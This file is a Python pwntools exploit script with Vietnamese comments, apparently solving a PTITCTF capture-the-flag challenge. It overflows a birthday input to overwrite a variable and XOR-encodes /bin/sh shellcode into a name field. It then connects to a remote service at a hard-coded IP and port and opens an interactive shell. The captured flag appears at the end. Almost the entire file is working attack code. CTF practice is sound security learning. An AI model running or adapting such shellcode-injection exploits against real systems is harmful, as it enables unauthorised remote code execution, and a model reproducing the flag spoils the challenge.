#!/usr/bin/env python3
from pwn import *

# --- Cài đặt ---

# Cài đặt kiến trúc mục tiêu là amd64 (Linux 64-bit)
# Điều này rất quan trọng để pwntools tạo ra shellcode chính xác.
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info' # Hiển thị thông tin chi tiết khi script chạy

# Thông tin server mục tiêu
host = '103.197.184.48'
port = 13333

# --- Bước 1: Chuẩn bị Payload ---

# Payload cho "ngày sinh" (birthday) để ghi đè biến 'a'.
# Gồm 52 byte đệm (để lấp đầy `buffer`) và 4 byte giá trị 0xDEADBEEF.
birthday_payload = b'A' * 52 + p32(0xDEADBEEF)

# Tạo shellcode để thực thi `/bin/sh`.
# pwntools sẽ tự động tạo mã máy phù hợp với context.arch đã cài đặt.
shellcode = asm(shellcraft.sh())
log.info(f"Shellcode đã tạo dài {len(shellcode)} bytes.")

# Vòng lặp for trong chương trình C chỉ xử lý 50 byte đầu tiên.
# Chúng ta cần đệm shellcode cho đủ 50 byte bằng các byte NOP (0x90) hoặc null (b'\0').
# Dùng ljust với byte null là một lựa chọn an toàn.
padded_shellcode = shellcode.ljust(50, b'\0')
log.info(f"Shellcode sau khi đệm dài {len(padded_shellcode)} bytes.")


# --- Bước 2: Xử lý phép XOR ---

# Khóa XOR chính là payload "ngày sinh" mà chúng ta gửi.
# QUAN TRỌNG: Hàm `fgets` sẽ đọc cả ký tự xuống dòng ('\n'),
# vì vậy chúng ta phải thêm nó vào khóa XOR để giải mã chính xác.
xor_key = birthday_payload + b'\n'

# Mã hóa shellcode đã đệm bằng cách XOR nó với khóa.
# Khi chương trình mục tiêu thực hiện lại phép XOR, nó sẽ khôi phục shellcode gốc.
# Hàm xor() của pwntools sẽ XOR `padded_shellcode` với 50 byte đầu tiên của `xor_key`.
name_payload = xor(padded_shellcode, xor_key)
log.info("Đã tạo payload 'tên' bằng cách mã hóa shellcode với khóa XOR.")

# --- Bước 3: Khai thác ---

# Bắt đầu kết nối đến server
log.info(f"Đang kết nối đến {host}:{port}...")
p = remote(host, port)

# Gửi payload tên (shellcode đã mã hóa)
p.recvuntil(b'- Enter your name: ')
p.sendline(name_payload)
log.info("Đã gửi payload 'tên' (shellcode đã mã hóa).")

# Gửi payload ngày sinh (để ghi đè 'a' và làm khóa XOR)
p.recvuntil(b'- Enter your birthday: ')
p.sendline(birthday_payload)
log.info("Đã gửi payload 'ngày sinh' (để ghi đè biến 'a').")

# --- Bước 4: Tương tác với Shell ---

# Nếu khai thác thành công, chương trình sẽ thực thi shellcode.
# Chuyển sang chế độ tương tác để có thể gõ lệnh vào shell.
log.success("Khai thác thành công! Chuyển sang chế độ tương tác...")
p.interactive()

# flag: PTITCTF{ShElLcOdE_iS_ThE_cOrE_oF_a_PaYlOaD_4495749}